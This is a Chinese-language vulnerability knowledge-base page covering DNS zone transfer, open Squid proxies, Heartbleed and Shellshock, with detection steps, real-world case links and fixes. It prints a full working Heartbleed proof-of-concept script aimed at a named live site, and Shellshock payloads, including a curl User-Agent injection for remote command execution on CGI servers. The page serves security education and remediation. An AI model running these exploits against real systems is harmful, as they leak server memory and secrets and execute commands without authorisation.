#其他漏洞
##DNS 域传送漏洞

**1、域传送简介**

---
DNS是整个互联网公司业务的基础，目前越来越多的互联网公司开始搭建自己的DNS服务器进行解析服务，同时由于DNS服务是一项非常重要的基础性服务，因此很多公司会对DNS服务器进行主备配置。为了保证DNS服务器主备之间数据的同步，DNS域传送因运而生。

**2、错误配置及利用**

---
默认的bind允许任何人来同步数据，所有的dns解析记录都会被泄露，直接暴漏整体网络结构

win下DNS传送检测方法



**3、实际案例**

---
[优酷 DNS 域传送漏洞](http://www.wooyun.org/bugs/wooyun-2011-01828)

[去哪儿DNS域传送漏洞](http://www.wooyun.org/bugs/wooyun-2011-02151)

[IT168.com DNS 域传送漏洞](http://www.wooyun.org/bugs/wooyun-2012-04229)

**4、修复方法**

---
只需要在相应的zone、options中添加allow-transfer限制可以进行同步的服务器就可以了，可以有两种方式：限制IP、使用key认证。

使用限制IP的方法：

	vim /etc/named.conf
	#在options中添加
	allow-transfer {192.168.5.6;};
或者

	vim /etc/named.rfc1912.zones
	#对应的zone中添加
	allow-transfer {192.168.5.1;};
	
**5、漏洞发现**

---
手工检测方法,使用dig直接请求

	dig @192.168.5.6 test.com axfr
自动检测方法，调用nmap进行扫描

	nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=test.com -p 53 -Pn 192.168.5.6

**6、相关资源**

---
[DNS域传送信息泄露](http://drops.wooyun.org/papers/64)

[批量网站DNS区域传送漏洞检测——bash shell实现](http://drops.wooyun.org/tips/2014)

[如何找DNS域传送漏洞](http://zone.wooyun.org/content/5089)

[Linux 检测域传送](http://zone.wooyun.org/content/18989)


##squid

**1、squid简介**

---
Squid是一种用来缓冲Internet数据的软件。它是这样实现其功能的，接受来自人们需要下载的目标（object）的请求并适当地处理这些请求。也就是说，如果一个人想下载一web页面，他请求Squid为他取得这个页面。Squid随之连接到远程服务器（比如：http://squid.nlanr.net/）并向这个页面发出请求。然后，Squid显式地聚集数据到客户端机器，而且同时复制一份。当下一次有人需要同一页面时，Squid可以简单地从磁盘中读到它，那样数据迅即就会传输到客户机上。当前的Squid可以处理HTTP，FTP，GOPHER，SSL和WAIS等协议。但它不能处理如POP，NNTP，RealAudio以及其它类型的东西。

**2、squid服务器架设**

---
测试环境Centos 6.2 安装squid

	yum install squid -y
	/etc/init.d/squid start
相关配置文件

配置文件目录
	/etc/squid
主要配置文件
	/etc/squid/squid.conf
监听端口
	TCP:3128
此时的squid就是一个没有任何保护的，可以被任何人使用。 配置账户密码

	vim /etc/squid/squid.conf
	#在配置文件最上层添加以下内容
	#Add auth
	auth_param basic program /usr/lib64/squid/ncsa_auth /usr/etc/passwd
	acl password proxy_auth REQUIRED
	http_access allow password
	#生成密码文件
	htpasswd -c /usr/etc/passwd test
	#重启服务
	/etc/init.d/squid restart
此时使用浏览器使用该代理时需要输入用户名和密码

**3、错误配置及利用**

---
***3、1 未配置权限直接使用进入内网***

作为一个squid代理服务器，未做任何验证，就可以使用，可以直接访问内网

***3、2 配置不当导致敏感信息泄露***

访问

	http://ip/cgi-bin/cachemgr.cgi
或者

	squidclient -h ip -p port mgr:info
在没有做限制的时候，可以查看squid的一些基本信息

**4、实际案例**

---

http://www.wooyun.org/bugs/wooyun-2010-0181

http://www.wooyun.org/bugs/wooyun-2010-021602

http://www.wooyun.org/bugs/wooyun-2010-025343

**5、修复方案**

---
***5.1 配置密码***

***5.2 信息泄露***

对于cachemgr.cgi泄露的话，可以直接删除cgi或者做一个401认证。

**6、相关资源**

---
http://www.squid-cache.org/

http://home.arcor.de/pangj/squid/

##心脏出血（heart bleed）漏洞

**1、漏洞简介**

---
OpenSSL 是一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及SSL协议，并提供丰富的应用程序供测试或其它目的使用。

2014年4月7日OpenSSL的Heartbleed漏洞被曝光，该漏洞破坏性之大和影响的范围之广，堪称网络安全里程碑事件。

该漏洞可读取服务器上内存中随机64KB数据，可能导致服务器内重要的敏感信息（如用户cookie，服务器秘钥）等泄露。

**2、漏洞成因**

---
当使用基于openssl通信的双方建立安全连接后，客户端需要不断的发送心跳信息到服务器，以确保服务器是可用的。

基本的流程是：客户端发送一段固定长度的字符串到服务器，服务器接收后，返回该固定长度的字符串。比如客户端发送“hello,world”字符串到服务器，服务器接受后，原样返回“hello,world”字符串，这样客户端就会认为openssl服务器是可用的。

客户端发送的心跳信息结构体定义为：

	struct hb {
	      int type;
	      int length;
	      unsigned char *data;                                                    
	};
其中type为心跳的类型，length为data的大小。

其中关于data字段的内容结构为：

type字段占一个字节，payload字段占两个字节，其余的为payload的具体内容。
详情如下所示：

	字节序号        备注
	
	0                 type
	
	1-2              data中具体的内容的大小为payload
	
	3-len            具体的内容pl      
当服务器收到消息后，会对该消息进行解析，也就是对data中的字符串进行解析，通过解析第0位得到type，第1-2位得到payload，接着申请(1+2+payload)大小的内存，然后再将相应的数据拷贝到该新申请的内存中。

假如客户端发送的data数据为“006abcdef”，那么服务器端解析可以得到type=0, payload=06, pl='abcdef'，申请(1+2+6=9)大小的内存，然后再将type, payload, pl写到新申请的内存中。

但在存在漏洞的OpenSSL代码中包括TLS(TCP)和DTLS(UDP)都没有做边界的检测。服务器会按照payload的大小申请内存并将内存中的数据发回给客户端。 导致攻击者可以利用这个漏洞来获得TLS链接对端（可以是服务器，也可以是客户端）内存中的一些数据，至少可以获得16KB每次，理论上讲最大可以获取64KB。

**3、漏洞检测及利用**

---
利用代码：

	#!/usr/bin/python
	 
	# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
	# The author disclaims copyright to this source code.
	 
	import sys
	import struct
	import socket
	import time
	import select
	import re
	from optparse import OptionParser
	 
	options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
	options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
	 
	def h2bin(x):
	    return x.replace(' ', '').replace('\n', '').decode('hex')
	 
	hello = h2bin('''
	16 03 02 00  dc 01 00 00 d8 03 02 53
	43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
	bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
	00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
	00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
	c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
	c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
	c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
	c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
	00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
	03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
	00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
	00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
	00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
	00 0f 00 01 01                                  
	''')
	 
	hb = h2bin(''' 
	18 03 02 00 03
	01 40 00
	''')
	 
	def hexdump(s):
	    for b in xrange(0, len(s), 16):
	        lin = [c for c in s[b : b + 16]]
	        hxdat = ' '.join('%02X' % ord(c) for c in lin)
	        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
	        print '  %04x: %-48s %s' % (b, hxdat, pdat)
	    print
	 
	def recvall(s, length, timeout=5):
	    endtime = time.time() + timeout
	    rdata = ''
	    remain = length
	    while remain > 0:
	        rtime = endtime - time.time() 
	        if rtime < 0:
	            return None
	        r, w, e = select.select([s], [], [], 5)
	        if s in r:
	            data = s.recv(remain)
	            # EOF?
	            if not data:
	                return None
	            rdata += data
	            remain -= len(data)
	    return rdata
	 
	 
	def recvmsg(s):
	    hdr = recvall(s, 5)
	    if hdr is None:
	        print 'Unexpected EOF receiving record header - server closed connection'
	        return None, None, None
	    typ, ver, ln = struct.unpack('>BHH', hdr)
	    pay = recvall(s, ln, 10)
	    if pay is None:
	        print 'Unexpected EOF receiving record payload - server closed connection'
	        return None, None, None
	    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
	    return typ, ver, pay
	 
	def hit_hb(s):
	    s.send(hb)
	    while True:
	        typ, ver, pay = recvmsg(s)
	        if typ is None:
	            print 'No heartbeat response received, server likely not vulnerable'
	            return False
	 
	        if typ == 24:
	            print 'Received heartbeat response:'
	            hexdump(pay)
	            if len(pay) > 3:
	                print 'WARNING: server returned more data than it should - server is vulnerable!'
	            else:
	                print 'Server processed malformed heartbeat, but did not return any extra data.'
	            return True
	 
	        if typ == 21:
	            print 'Received alert:'
	            hexdump(pay)
	            print 'Server returned error, likely not vulnerable'
	            return False
	 
	def main():
	    opts, args = options.parse_args()
	    if len(args) < 1:
	        options.print_help()
	        return
	 
	    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	    print 'Connecting...'
	    sys.stdout.flush()
	    s.connect((args[0], opts.port))
	    print 'Sending Client Hello...'
	    sys.stdout.flush()
	    s.send(hello)
	    print 'Waiting for Server Hello...'
	    sys.stdout.flush()
	    while True:
	        typ, ver, pay = recvmsg(s)
	        if typ == None:
	            print 'Server closed connection without sending Server Hello.'
	            return
	        # Look for server hello done message.
	        if typ == 22 and ord(pay[0]) == 0x0E:
	            break
	 
	    print 'Sending heartbeat request...'
	    sys.stdout.flush()
	    s.send(hb)
	    hit_hb(s)
	 
	if __name__ == '__main__':
	    main()
使用方法

py www.wooyun.org --port=443
网站若存在漏洞将返回服务器中的内存数据。

**4、影响范围**

---
使用了以下版本的 OpenSSL的服务器。

OpenSSL1.0.1、1.0.1a 、1.0.1b 、1.0.1c 、1.0.1d 、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等

**5、实际案例**

---
[淘宝主站运维不当导致可以登录随机用户并且获取服务器敏感信息](http://www.wooyun.org/bugs/wooyun-2010-055932)

[微信网页版和公众账号版运维不当导致可随机登录微信用户并获取服务器敏感信息](http://www.wooyun.org/bugs/wooyun-2010-055941)

[京东某分站openssl漏洞导致敏感信息泄露及全站随机用户登录(证明可登录)](http://www.wooyun.org/bugs/wooyun-2010-056253)

[雅虎主站运维不当导致可以登录随机用户并且获取服务器敏感信息](http://www.wooyun.org/bugs/wooyun-2010-055942)

**6、漏洞修复**

---
升级OpenSSL到版本1.0.1g及以上。

**7、相关资源**

---
[CVE-2014-0160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160)

[openssl poc](https://gist.github.com/RixTox/10222402)


##bash漏洞（shellshock）

**1、漏洞简介**

---
CVE-2014-6271漏洞又称破壳漏洞，是Stéphane Chazelas（法国）于2014年9月中旬发现的SHELL的一个漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。该漏洞影响极其严重，修复过程也十分坎坷。时间线大致如下：

9月24日：CVE-2014-6271被公开，补丁也快速形成，但因补丁修复不完整导致CVE-2014-7169；

9月27日：因前两个漏洞补丁修复不完整导致CVE-2014-6277；

9月30日：因在前三个漏洞补丁修复不完整导致CVE-2014-6278；

9月28日：Bash的两个溢出漏洞又被公开CVE-2014-7186、CVE-2014-7187。

**2、漏洞成因**

---
存在漏洞的bash会将形如

	$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
的字符解析为一个函数定义和一个command。导致任意命令执行。

**3、漏洞检测及利用**

---
bash破壳漏洞本地检测 官方验证版
	
	env x='() { :;}; echo vulnerable; bash -c "echo this is a test"
若系统bash存在漏洞则会打印出

	vulnerable
	this is a test
官方patch绕过版

	env -i X='() { (a)=>\' bash -c 'echo date'; cat echo
http cgi远程命令执行

	curl -A "() { :; }; /bin/ls /; uname -a" http://www.aaa.com/bbb.cgi -v

**4、影响范围**

---
“破壳”是一个严重漏洞的别名，在Red Hat、CentOS、Ubuntu 、Fedora 、Amazon Linux 、OS X 10.10中均拥有存在CVE-2014-6271（即“破壳”漏洞）漏洞的Bash版本，同时由于Bash在各主流操作系统的广泛应用，此漏洞的影响范围包括但不限于大多数应用Bash的Unix、Linux、Mac OS X，而针对这些操作系统管理下的数据均存在高危威胁。

此漏洞可能会影响到使用ForceCommand功能的OpenSSH sshd、使用modcgi或modcgid的Apache服务器、DHCP客户端、SMTP服务器等其他使用bash作为解释器的应用。

**5、实际案例**

---
[中国医学科学院病原生物学研究所官网存在破壳漏洞](http://www.wooyun.org/bugs/wooyun-2010-078387)

[华中农业大学-生物信息学中心-下某实验室网站存在破壳漏洞](http://www.wooyun.org/bugs/wooyun-2010-078029)

[CSDN某业务Bash（CVE-2014-6271）漏洞导致系统可被入侵](http://www.wooyun.org/bugs/wooyun-2010-077300)

**6、漏洞修复**

---
安装最新的补丁

在各种GNU/Linux发行版里需要升级：

Debian-based（包括Ubuntu）:

	sudo apt-get update && apt-get upgrade
Gentoo：

	sudo emerge --sync && glsa-check -f affected
OpenSSH:

	加入no-pty

**7、相关资源**

---
[从语法解析角度分析Bash破壳漏洞](http://www.freebuf.com/articles/web/45520.html)

[破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之一](http://www.freebuf.com/news/48331.html)

[破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之二](http://www.freebuf.com/articles/system/48357.html)

[破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之三](http://www.freebuf.com/articles/system/48406.html)

[Bash破壳漏洞（ShellShock）再变身：针对邮件服务器SMTP攻击](http://www.freebuf.com/news/49292.html)

[安全科普：让高大上的Bash破壳漏洞不再难理解（上）](http://www.freebuf.com/articles/system/50065.html)

[安全科普：让高大上的Bash破壳漏洞不再难理解（下）](http://www.freebuf.com/articles/system/50707.html)

[CVE-2014-6271资料汇总](http://drops.wooyun.org/papers/3064)

[Shellshock漏洞回顾与分析测试](http://drops.wooyun.org/papers/3268)